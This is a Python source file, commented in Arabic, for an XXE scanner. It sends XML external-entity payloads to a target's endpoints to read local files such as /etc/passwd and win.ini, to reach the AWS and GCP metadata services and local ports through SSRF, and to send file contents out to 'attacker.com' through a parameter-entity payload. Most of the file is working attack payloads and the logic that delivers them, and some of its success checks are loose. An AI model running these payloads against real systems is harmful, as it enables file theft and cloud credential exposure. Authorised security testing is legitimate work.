"""
XXE Scanner - Classic XML External Entity Scanner
==================================================

هذا الماسح يكتشف ثغرات XXE الكلاسيكية من خلال:
- قراءة الملفات المحلية
- SSRF عبر XXE
- Parameter Entity Injection
- Error-based XXE
"""

import re
import time
import random
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse

try:
    from core.http_handler import HTTPHandler
    from core.response_analyzer import ResponseAnalyzer
    from core.logger import Logger
    from utils.validators import is_valid_url
except ImportError:
    # Fallback للاختبار المستقل
    class HTTPHandler:
        def __init__(self, *args, **kwargs): pass
        def send_request(self, *args, **kwargs): 
            return type('Response', (), {'status_code': 200, 'text': '', 'headers': {}})()
    
    class ResponseAnalyzer:
        def analyze(self, *args, **kwargs): return []
    
    class Logger:
        def info(self, msg): print(f"[INFO] {msg}")
        def success(self, msg): print(f"[✓] {msg}")
        def warning(self, msg): print(f"[!] {msg}")
        def error(self, msg): print(f"[✗] {msg}")
    
    def is_valid_url(url): return True


class XXEScanner:
    """
    ماسح XXE الأساسي - يكتشف الثغرات الكلاسيكية
    """
    
    def __init__(self, target: str, config: Optional[Dict] = None):
        """
        تهيئة الماسح
        
        Args:
            target: URL الهدف
            config: إعدادات مخصصة
        """
        self.target = target
        self.config = config or {}
        self.http = HTTPHandler()
        self.analyzer = ResponseAnalyzer()
        self.logger = Logger()
        
        # إعدادات افتراضية
        self.timeout = self.config.get('timeout', 30)
        self.max_payloads = self.config.get('max_payloads', 50)
        self.test_file_read = self.config.get('test_file_read', True)
        self.test_ssrf = self.config.get('test_ssrf', True)
        
        # نتائج الفحص
        self.vulnerabilities = []
        self.tested_endpoints = []
        
        # ملفات للاختبار (Linux/Windows)
        self.test_files = {
            'linux': [
                '/etc/passwd',
                '/etc/hosts',
                '/etc/group',
                '/proc/self/environ',
                '/proc/version',
            ],
            'windows': [
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\boot.ini',
                'C:\\Windows\\win.ini',
            ]
        }
        
        # علامات النجاح
        self.success_indicators = {
            'linux_passwd': [r'root:x:0:0:', r'daemon:', r'/bin/bash', r'/home/'],
            'windows_hosts': [r'127\.0\.0\.1', r'localhost'],
            'win_ini': [r'\[fonts\]', r'\[extensions\]'],
        }
    
    
    def scan(self) -> List[Dict]:
        """
        بدء عملية الفحص الكامل
        
        Returns:
            قائمة بالثغرات المكتشفة
        """
        self.logger.info(f"🔍 بدء فحص XXE للهدف: {self.target}")
        
        # 1. اكتشاف XML endpoints
        xml_endpoints = self._discover_xml_endpoints()
        self.logger.info(f"📡 تم اكتشاف {len(xml_endpoints)} XML endpoint")
        
        # 2. اختبار كل endpoint
        for endpoint in xml_endpoints:
            self._test_endpoint(endpoint)
        
        # 3. عرض النتائج
        self._display_results()
        
        return self.vulnerabilities
    
    
    def _discover_xml_endpoints(self) -> List[str]:
        """
        اكتشاف XML endpoints في الموقع
        """
        endpoints = []
        
        # 1. الصفحة الرئيسية
        endpoints.append(self.target)
        
        # 2. مسارات شائعة
        common_paths = [
            '/api/xml',
            '/xml',
            '/soap',
            '/services',
            '/upload',
            '/import',
            '/parse',
            '/rss',
            '/feed',
        ]
        
        for path in common_paths:
            url = urljoin(self.target, path)
            endpoints.append(url)
        
        # 3. فحص سريع للتحقق من قبول XML
        valid_endpoints = []
        for endpoint in endpoints:
            if self._accepts_xml(endpoint):
                valid_endpoints.append(endpoint)
        
        return valid_endpoints
    
    
    def _accepts_xml(self, url: str) -> bool:
        """
        التحقق من أن الـ endpoint يقبل XML
        """
        try:
            # إرسال XML بسيط
            simple_xml = '<?xml version="1.0"?><test>data</test>'
            
            response = self.http.send_request(
                url=url,
                method='POST',
                data=simple_xml,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            
            # تحقق من الاستجابة
            if response.status_code in [200, 201, 400, 500]:
                # حتى الأخطاء تعني أنه يعالج XML
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في فحص {url}: {str(e)}")
        
        return False
    
    
    def _test_endpoint(self, url: str):
        """
        اختبار endpoint واحد لجميع أنواع XXE
        """
        self.logger.info(f"🎯 اختبار: {url}")
        self.tested_endpoints.append(url)
        
        # 1. اختبار قراءة الملفات
        if self.test_file_read:
            self._test_file_read(url)
        
        # 2. اختبار SSRF
        if self.test_ssrf:
            self._test_ssrf(url)
        
        # 3. اختبار Parameter Entity
        self._test_parameter_entity(url)
        
        # 4. اختبار Error-based
        self._test_error_based(url)
    
    
    def _test_file_read(self, url: str):
        """
        اختبار قراءة الملفات المحلية
        """
        self.logger.info("  📄 اختبار قراءة الملفات...")
        
        # اختبار ملفات Linux
        for file_path in self.test_files['linux']:
            payload = self._generate_file_read_payload(file_path)
            
            if self._send_xxe_payload(url, payload, file_path, 'linux'):
                return  # توقف بعد أول نجاح
        
        # اختبار ملفات Windows
        for file_path in self.test_files['windows']:
            payload = self._generate_file_read_payload(file_path)
            
            if self._send_xxe_payload(url, payload, file_path, 'windows'):
                return
    
    
    def _generate_file_read_payload(self, file_path: str) -> str:
        """
        توليد payload لقراءة ملف
        """
        payloads = [
            # Payload 1: Classic XXE
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file://{file_path}" >
]>
<foo>&xxe;</foo>''',
            
            # Payload 2: Using parameter entity
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///'>">
%xxe;
%eval;
]>
<foo>test</foo>''',
            
            # Payload 3: PHP wrapper (للـ PHP)
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}" >
]>
<foo>&xxe;</foo>''',
            
            # Payload 4: Nested entities
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
%all;
]>
<foo>&fileContents;</foo>''',
        ]
        
        # اختر payload عشوائي
        return random.choice(payloads)
    
    
    def _send_xxe_payload(self, url: str, payload: str, 
                          file_path: str, os_type: str) -> bool:
        """
        إرسال XXE payload والتحقق من النجاح
        
        Returns:
            True إذا نجح الهجوم
        """
        try:
            response = self.http.send_request(
                url=url,
                method='POST',
                data=payload,
                headers={
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml, */*'
                },
                timeout=self.timeout
            )
            
            # تحليل الاستجابة
            if self._check_xxe_success(response, file_path, os_type):
                # ثغرة مؤكدة!
                self._report_vulnerability(
                    url=url,
                    vuln_type='XXE - File Read',
                    payload=payload,
                    evidence=response.text[:500],
                    severity='critical',
                    file_read=file_path
                )
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في إرسال payload: {str(e)}")
        
        return False
    
    
    def _check_xxe_success(self, response, file_path: str, os_type: str) -> bool:
        """
        التحقق من نجاح XXE من خلال الاستجابة
        """
        response_text = response.text.lower()
        
        # 1. تحقق من محتوى الملف
        if '/etc/passwd' in file_path:
            for indicator in self.success_indicators['linux_passwd']:
                if re.search(indicator, response_text, re.IGNORECASE):
                    self.logger.success(f"  ✓ تم قراءة {file_path}!")
                    return True
        
        elif 'hosts' in file_path:
            for indicator in self.success_indicators['windows_hosts']:
                if re.search(indicator, response_text, re.IGNORECASE):
                    self.logger.success(f"  ✓ تم قراءة {file_path}!")
                    return True
        
        elif 'win.ini' in file_path:
            for indicator in self.success_indicators['win_ini']:
                if re.search(indicator, response_text, re.IGNORECASE):
                    self.logger.success(f"  ✓ تم قراءة {file_path}!")
                    return True
        
        # 2. تحقق من Base64 (PHP wrapper)
        if re.search(r'[A-Za-z0-9+/]{50,}={0,2}', response_text):
            self.logger.success("  ✓ محتوى Base64 مكتشف (PHP wrapper)!")
            return True
        
        # 3. تحقق من علامات عامة
        suspicious_patterns = [
            r'root:.*:0:0:',
            r'\[boot loader\]',
            r'# Copyright',
            r'HKEY_',
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    
    def _test_ssrf(self, url: str):
        """
        اختبار SSRF عبر XXE
        """
        self.logger.info("  🌐 اختبار SSRF...")
        
        # URLs للاختبار
        test_urls = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://127.0.0.1:8080',
            'http://localhost:22',
        ]
        
        for test_url in test_urls:
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{test_url}" >
]>
<foo>&xxe;</foo>'''
            
            try:
                response = self.http.send_request(
                    url=url,
                    method='POST',
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout
                )
                
                # تحقق من SSRF
                if self._check_ssrf_success(response, test_url):
                    self._report_vulnerability(
                        url=url,
                        vuln_type='XXE - SSRF',
                        payload=payload,
                        evidence=response.text[:500],
                        severity='high',
                        ssrf_target=test_url
                    )
                    return
                    
            except Exception as e:
                pass
    
    
    def _check_ssrf_success(self, response, test_url: str) -> bool:
        """
        التحقق من نجاح SSRF
        """
        response_text = response.text.lower()
        
        # علامات AWS metadata
        if '169.254.169.254' in test_url:
            if any(word in response_text for word in ['ami-id', 'instance-id', 'hostname']):
                self.logger.success("  ✓ SSRF إلى AWS Metadata!")
                return True
        
        # علامات GCP metadata
        if 'metadata.google.internal' in test_url:
            if any(word in response_text for word in ['project', 'instance', 'service-accounts']):
                self.logger.success("  ✓ SSRF إلى GCP Metadata!")
                return True
        
        # علامات عامة للخوادم المحلية
        if any(word in response_text for word in ['ssh', 'http', 'server', 'welcome']):
            self.logger.success(f"  ✓ SSRF نجح إلى {test_url}!")
            return True
        
        return False
    
    
    def _test_parameter_entity(self, url: str):
        """
        اختبار Parameter Entity XXE
        """
        self.logger.info("  ⚙️ اختبار Parameter Entity...")
        
        payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%xxe;'>">
%eval;
%exfil;
]>
<foo>test</foo>'''
        
        try:
            response = self.http.send_request(
                url=url,
                method='POST',
                data=payload,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout
            )
            
            # تحليل الاستجابة
            if 'root:' in response.text or 'daemon:' in response.text:
                self._report_vulnerability(
                    url=url,
                    vuln_type='XXE - Parameter Entity',
                    payload=payload,
                    evidence=response.text[:500],
                    severity='critical'
                )
                self.logger.success("  ✓ Parameter Entity XXE نجح!")
                
        except Exception as e:
            pass
    
    
    def _test_error_based(self, url: str):
        """
        اختبار Error-based XXE
        """
        self.logger.info("  ⚠️ اختبار Error-based XXE...")
        
        # payload يسبب خطأ يكشف معلومات
        payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x26;#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>'''
        
        try:
            response = self.http.send_request(
                url=url,
                method='POST',
                data=payload,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout
            )
            
            # تحقق من رسائل الخطأ
            error_indicators = [
                'parse error',
                'xml error',
                'entity',
                'DOCTYPE',
                'root:x:0:0',
            ]
            
            response_lower = response.text.lower()
            for indicator in error_indicators:
                if indicator in response_lower:
                    self._report_vulnerability(
                        url=url,
                        vuln_type='XXE - Error-based',
                        payload=payload,
                        evidence=response.text[:500],
                        severity='high'
                    )
                    self.logger.success("  ✓ Error-based XXE مكتشف!")
                    return
                    
        except Exception as e:
            pass
    
    
    def _report_vulnerability(self, **kwargs):
        """
        تسجيل ثغرة مكتشفة
        """
        vuln = {
            'timestamp': time.time(),
            'scanner': 'XXE Scanner',
            'confidence': 95,
            'cvss_score': 9.0 if kwargs.get('severity') == 'critical' else 7.5,
            'cwe': 'CWE-611',
            **kwargs
        }
        
        self.vulnerabilities.append(vuln)
        self.logger.success(f"🔴 ثغرة مكتشفة: {kwargs.get('vuln_type')} في {kwargs.get('url')}")
    
    
    def _display_results(self):
        """
        عرض ملخص النتائج
        """
        self.logger.info("\n" + "="*60)
        self.logger.info("📊 ملخص نتائج فحص XXE")
        self.logger.info("="*60)
        self.logger.info(f"🎯 Endpoints مفحوصة: {len(self.tested_endpoints)}")
        self.logger.info(f"🔴 ثغرات مكتشفة: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            self.logger.info("\n🔥 الثغرات المكتشفة:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                self.logger.info(f"\n  {i}. {vuln['vuln_type']}")
                self.logger.info(f"     URL: {vuln['url']}")
                self.logger.info(f"     Severity: {vuln['severity'].upper()}")
                self.logger.info(f"     CVSS: {vuln['cvss_score']}")
        else:
            self.logger.info("\n✅ لم يتم اكتشاف ثغرات XXE")


# مثال على الاستخدام
if __name__ == "__main__":
    scanner = XXEScanner("https://example.com")
    results = scanner.scan()
    
    print(f"\n\nتم اكتشاف {len(results)} ثغرة")